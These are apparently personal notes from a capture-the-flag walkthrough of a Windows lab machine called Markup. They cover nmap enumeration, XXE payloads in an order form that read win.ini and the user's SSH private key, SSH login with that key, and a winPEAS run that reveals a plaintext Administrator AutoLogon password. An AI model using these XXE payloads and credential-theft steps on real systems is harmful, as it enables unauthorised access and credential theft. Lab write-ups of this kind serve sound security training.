Here are notes from the named target:
Target is Windows
Host name Markup
IP 10.10.10.49

#Enumeration
Start with simple nmap - nmap -A -v 10.10.10.49 or nmap -sV -sC -p- -Pn 10.10.10.49 --min-rate=10000
```yaml

With ports 80 and 443 open use browser to check web page which has login screen. Try out all collected credentials and find that Daniel and password from the target Included work to log you into the site. Try on the SSH server is nogo.
```yaml
# ssh daniel@10.10.10.49                                                       
The authenticity of host '10.10.10.49 (10.10.10.49)' can't be established.
ECDSA key fingerprint is SHA256:+ApFLFVrSG3bOU5dk/VwAR8tNLb+f4QVdkbysGCBSrc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.49' (ECDSA) to the list of known hosts.

```
Web page exploring notices that a cookie - PHPSESSID is set when Daniel logs in

Start up Burp and capture some Order process traffic we see that orders are sent to server in xml
```yaml
Cookie: PHPSESSID=e9rvi3an2fa6pilhpeq6g5efas
<?xml version = "1.0"?><order><quantity></quantity><item>Home Appliances</item><address></address></order>
```

So to test to see if it is vulnerable send this back instead :
```yaml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>
```
As data is processed in XML format, there is good chance of an XXE (XML External Entity) vulnerability. An XXE vulnerability occurs due to unsafe parsing of XML input, leading to LFI as well as RCE. Testing with the following payload yields good results.

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>

LFI Cheat sheet - https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/

SSH server port. SSH private keys are usually stored in C:\Users\username\.ssh\id_rsa  and ssh is open plus we know we have a user named Daniel so if he has a ssh key stored on the server we can ssh in using the key instead of his password - lets use LFI to check that location. Using the process of submitting an Order and replacing what the pages sends with the LFI string below and then catch the RESPONSe in BURP

```yaml
REQUEST

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/Users/Daniel/.ssh/id_rsa'>]><order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>

#The exfiltration was successful and the private key can be used to login to the server as daniel.

#Where to put the file in Kali. SSH keys are found in ~/.ssh. Create a fille named id_rsa and then paste the key into it.

Save that file and then shange it's permissions so it can be used with:

chmod 400 id_rsa

Connect to the server via SSH with this
```yaml
ssh -i id_rsa daniel@10.10.10.49

Now to Enum the server whithin:

Start a http server in your enum folder then wget the file to the windows server and run it

+] Looking for AutoLogon credentials                                          
    Some AutoLogon credentials were found!!                                           
    DefaultUserName               :  Administrator
    DefaultPassword               :  Yhk}QE&j<3M
    
SSH to the server and use the credentials found with winenum.exe

SMB SERVER

If WGET is not available you can run SMB server on Kali and use the Native net commands to get the file transferred or SCP
```yaml
scp -i ~/.ssh/id_rsa winPEAS64.exe daniel@10.10.10.49:c:/users/daniel/winPEAS64.exe
```
